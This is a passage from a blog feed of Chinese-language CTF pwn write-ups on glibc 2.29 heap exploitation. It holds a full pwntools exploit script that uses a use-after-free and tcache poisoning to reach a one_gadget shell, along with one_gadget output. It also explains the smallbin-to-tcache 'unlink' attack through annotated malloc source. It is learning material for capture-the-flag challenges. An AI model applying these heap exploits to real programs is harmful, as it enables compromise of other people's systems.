class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)(pools[index] + <span class="number">8LL</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(sizes[index] - <span class="number">8</span>));<span class="comment">// 从bk开始写入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后发现还需要用这个 0x400 控制 tcache bin 的 fd 。也就是这个 0x400 需要申请在 tcache bin 中的空闲空间，但是 tcache bin 在申请大堆块时，不会被整理后放入 unsorted bin 中，fastbin 等就会，所以利用 UAF 多次释放堆块填满 tcache bin 后，放入到 fastbin 中。由于还要泄露地址，所以 fastbin 中要两个连续堆块，遍历整理是触发 unlink 在 fd 和 bk 处写入 main_arean 地址。</p><p><img src="_images/libc2.29_tcache_doublefree/image-20210118145210565.png" alt="image-20210118145210565"></p><p>由于申请堆后，马上就写入 name ，且就这一次写入机会，所以要调试找到 main_arean 与目标地址偏移，partly write 将 fd 修改为 目标地址，后续通过申请 tcache 对应大小就能够将堆分配到目标地址：</p><p><img src="_images/libc2.29_tcache_doublefree/image-20210118145724807.png" alt="image-20210118145724807"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; index\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">sh.recvuntil(<span class="string">&quot; size&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; index\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; index\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; index\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editname</span>(<span class="params">name</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;ame:\n&quot;</span>)</span><br><span class="line">sh.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showname</span>():</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">editname(<span class="string">&#x27;\x28&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr)</span><br><span class="line">libc_base = addr - <span class="number">0x3ebc28</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0xe5622</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt; \n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot; index\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input size&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;60&quot;</span>)</span><br><span class="line"><span class="comment">#attach(sh)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5617 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe561e execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5622 execve(&quot;/bin/sh&quot;, rcx, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rcx] == NULL || rcx == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a428 execve(&quot;/bin/sh&quot;, rsi, [rax])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [[rax]] == NULL || [rax] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/7292">tcache poisoning在glibc2.29中的利用小结</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104531134/">i春秋2020新春战役PWN之document(绕过tcache的double free检测)</a></p><p><a href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">Tcache Attack学习记录</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="archives/0/"/>
      <url>archives/0/</url>
      
        <content type="html"><![CDATA[<h1 id="Libc2-29-unlink-Attack"><a href="#Libc2-29-unlink-Attack" class="headerlink" title="Libc2.29 unlink Attack"></a>Libc2.29 unlink Attack</h1><h2 id="unsortbin-变化"><a href="#unsortbin-变化" class="headerlink" title="unsortbin 变化"></a>unsortbin 变化</h2><p>libc2.23 没有对 unsortedbin 进行完整性检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br><span class="line">        size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>libc2.29 增加了完整性检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 开始遍历整理unsorted bin将堆块放入对应各种bin中*/</span></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* 提取倒数第二个chunk */</span></span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* libc2.29新增完整性检查 */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当 malloc、calloc 之类的从 smallbin 中取堆块时，取出成功后，如果 tcache 没有满就会将 smallbin 剩下的堆块放入 tcache 中，：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* malloc从small bin取空间 */</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 对应大小small bin不为空时 */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* 提前后一个chunk */</span></span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">    <span class="comment">/* 检查后一个chunk fd指针是否指向当前chunk，防止伪造 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="comment">/* 设置inuse位 */</span></span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* unlink取出victim */</span></span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">    <span class="comment">/* 当前size smallbin还有堆块时，将剩下smallbin放入对应大小tcache。前提是tcache有空余位置 */</span></span><br><span class="line">    <span class="comment">/* 获取size对应的tcache序号 */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">        <span class="comment">/* 检查tcache有没有满和smallbin有没有剩余堆块 */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="comment">/* 提取即将放入tcache堆块的后一块chunk */</span></span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">          <span class="comment">/* 设置标志位 */</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">          <span class="comment">/* 直接unlink将tc_victim取出，没有完整性检查 */</span></span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* 将tc_victim放入tcache */</span></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>smallbin 剩余堆块 unlink 取出没有进行检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="comment">/* 提取即将放入tcache堆块的后一块chunk */</span></span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">          <span class="comment">/* 设置标志位 */</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">          <span class="comment">/* 直接unlink将tc_victim取出，没有完整性检查 */</span></span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>涉及利用的几条关键语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>bin 是一个 libc 地址，也就是 0x7f 开头的 6 位地址。</p><p>当劫持 <code>tc_victim-&gt;bk</code> 也就是控制 <code>bck</code> 为我们<code>攻击地址-0x10</code>，<code>bck-&gt;fd = bin;</code> 将 bin 写入攻击地址。实现效果为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(target<span class="number">-0x10</span>)=bin</span><br></pre></td></tr></table></figure><p>攻击完成（放入一个堆块）后，这时原来的链表被打乱无法取出下一个堆块，所以攻击前需要让对应大小 tcache 数量为 6 ，放入一个堆完成攻击就退出循环不再放入堆块，就不会报错退出。</p><p>为了不报错需要同一大小堆块在 <strong><code>tcache</code>有 6 个</strong>、**<code>smallbin</code>有 2 个**。因为 tcache 机制，tcache 没有满时被释放堆块是放不进 smallbin 。 </p><p>用切割 unsortedbin 方法在 smallbin 放入两个堆块，即 <strong>last remainder</strong>。就是在 unsortedbin 拿了一大块堆块，如果用剩下的大于 remainder_size ，就将剩下的放到对应的 bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>假设 unsortedbin 中有一个 0x400 堆，malloc 0x300 后，unsorbin 剩下 0x100 。这时 malloc 一个比 0x100 大的空间，系统遍历 unsortedbin 将各个堆块放入对应的 bin 中，0x100 顺利放入 smallbin。</p><p>堆布置图示：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201124204915.png" alt="Libc2.29 unlink Attack"></p><p>chunk1 fd 指针需要是 chunk0 地址，用来绕过 chunk0 分配时的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* 检查后一个chunk fd指针是否指向当前chunk，防止伪造 */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201124204915.png" alt="Libc2.29 unlink Attack"></p><p>使用前提：</p><ol><li>UAF：用于修改 chunk1 的 bk</li><li>有能够跳过 tcache 申请堆的函数或机制：触发 smallbin unlink 放入 tcache </li><li>能泄露堆地址：chunk1 fd 填为 chunk0 地址，让 chunk0 成功分配</li></ol><p>实现效果：</p><p>任意地址写入一个 libc 地址（0x7fxxxxxxxxxx)</p><p>应用：</p><p>可以参考 libc2.23 unlink</p><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>HITCON CTF 2019 Quals — One Punch Man </p><p>[Black Watch 入群题]PWN2</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312">HITCON CTF 2019 Quals — One Punch Man </a></p><p><a href="https://ruan777.github.io/2020/02/04/HITCON2019-Quals-One-punch-Man/">HITCON2019-Quals One_punch_Man</a></p><p><a href="https://blog.csdn.net/qq_38154820/article/details/106294152">glibc2.29下unsortedbin_attack的替代方法</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 湖湘杯 PWN WriteUp</title>
      <link href="archives/215/"/>
      <url>archives/215/</url>
      
